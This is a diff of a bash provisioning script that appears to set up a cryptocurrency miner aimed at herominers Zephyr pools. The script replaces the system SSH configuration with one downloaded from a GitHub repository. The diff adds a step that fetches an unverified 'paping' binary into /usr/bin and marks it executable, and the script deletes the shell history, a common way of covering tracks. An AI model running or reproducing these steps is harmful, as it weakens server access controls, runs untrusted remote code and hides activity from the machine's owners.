@@ -2,7 +2,7 @@
 
 # Install necessary packages
 apt-get update -y
-apt-get install curl wget screen cron hping3 -y
+apt-get install curl wget screen cron -y
 
 # Setup SSH
 cd ~
@@ -17,7 +17,10 @@ wget https://raw.githubusercontent.com/realtkco/scripts/main/sshd_config -O sshd
 rm -rf /etc/ssh/sshd_config
 mv sshd_config /etc/ssh/sshd_config
 
-# Define the list of addresses for latency check
+# Installs Paping - Ensure this is the correct download method for your paping binary
+wget https://raw.githubusercontent.com/realtkco/scripts/main/paping -O /usr/bin/paping
+chmod +x /usr/bin/paping
+
 addresses=(
 "de.zephyr.herominers.com"
 "fi.zephyr.herominers.com"
@@ -39,11 +42,10 @@ minAddress=""
 # Ping each address and find the one with the lowest latency
 for address in "${addresses[@]}"
 do
-    result=$(hping3 --quiet -c 5 -p 1123 -S $address 2>&1 | grep round-trip | awk -F '/' '{print $5}')
-    result=${result%.*}
-    if [[ ! -z "$result" && "$result" =~ ^[0-9]+$ ]]; then
+    result=$(paping $address -p 1123 -c 5 | grep 'Average' | awk '{print $5}' | sed 's/ms//')
+    if [[ ! -z "$result" && "$result" =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
         echo "$address: $result ms"
-        if [ "$result" -lt "$minLatency" ]; then
+        if (( $(echo "$result < $minLatency" | bc -l) )); then
             minLatency="$result"
             minAddress="$address"
         fi
@@ -75,4 +77,3 @@ rm -rf ~/.bash_history
 
 clear
 
-echo "$(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")"
